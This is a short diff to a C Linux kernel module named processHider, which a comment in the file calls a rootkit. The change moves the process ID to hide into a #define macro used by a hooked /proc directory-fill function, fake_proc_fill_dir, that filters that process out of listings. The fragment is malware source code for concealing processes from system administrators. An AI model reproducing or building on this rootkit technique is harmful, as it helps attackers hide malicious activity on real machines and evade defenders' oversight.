@@ -8,6 +8,8 @@
 #include <linux/proc_fs.h>
 #include <linux/version.h>
 
+#define PID_TO_HIDE "1615"
+
 #include "processHider.h"
 /*
 Related things to manipulate to prevent rootkit being visable:
@@ -82,7 +84,7 @@ void hook_proc(struct proc_dir_entry *root) {
 
 
 int fake_proc_fill_dir(void *a, const char *buffer, int c, loff_t d, u64 e, unsigned f) {
-	char *tohidePID = "2314"; //TODO: make it possible to specify the pid to hide in an easier way...
+	char *tohidePID = PID_TO_HIDE; //TODO: make it possible to specify the pid to hide in an easier way...
 	
 	int doStringsMatch = (strcmp(buffer, tohidePID) == 0);
 	
